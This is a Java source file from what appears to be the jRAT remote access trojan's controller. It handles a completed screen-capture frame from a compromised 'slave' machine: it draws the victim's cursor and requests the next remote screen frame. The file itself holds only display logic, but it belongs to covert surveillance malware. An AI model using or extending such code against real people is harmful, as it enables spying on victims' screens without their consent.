package jrat.module.screen.packets;

import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.controller.packets.outgoing.Packet12RemoteScreen;
import jrat.controller.utils.CursorUtils;
import jrat.module.screen.ui.PanelScreenController;

import java.awt.*;
import java.awt.image.BufferedImage;

/**
 * Received when a frame has successfully transferred
 * Will draw cursor and other optional graphics
 */
public class PacketRemoteScreenCompleted implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		int mouseX = slave.readInt();
		int mouseY = slave.readInt();
				
		PanelScreenController frame = (PanelScreenController) slave.getPanel(PanelScreenController.class);
		
		if (frame != null) {
			BufferedImage buffer = frame.getBuffer();
			if (buffer != null) {
				BufferedImage image = new BufferedImage(buffer.getWidth(), buffer.getHeight(), BufferedImage.TYPE_INT_RGB);
				
				Graphics2D imageGraphics = (Graphics2D) image.getGraphics();
				
				imageGraphics.drawImage(buffer, 0, 0, buffer.getWidth(), buffer.getHeight(), null);
				CursorUtils.drawCursor(slave.getOperatingSystem().getType(), imageGraphics, mouseX, mouseY);
				
				boolean drawGrid = false;
				
				if (drawGrid) {
					imageGraphics.setColor(Color.red);
					for (int x = 0; x < frame.getRows(); x++) {
						for (int y = 0; y < frame.getColumns(); y++) {
							int chunkWidth = buffer.getWidth() / frame.getColumns();
							int chunkHeight = buffer.getHeight() / frame.getRows();
							imageGraphics.drawRect(chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight);
						}
					}
				}
				
				frame.drawOverlay(image);
				frame.setBlockSizeLabel(frame.getTransmitted() / 1024);
				frame.setChunksLabel(frame.getChunks());
				frame.setTransmitted(0);
			}
            if (frame.isRunning()) {
                slave.addToSendQueue(new Packet12RemoteScreen(frame.getImageSize(), frame.getQuality(), frame.getMonitor(), frame.getColumns(), frame.getRows()));
				frame.setTransmitted(0);
				frame.setChunks(0);
            }
   		}
	}

}
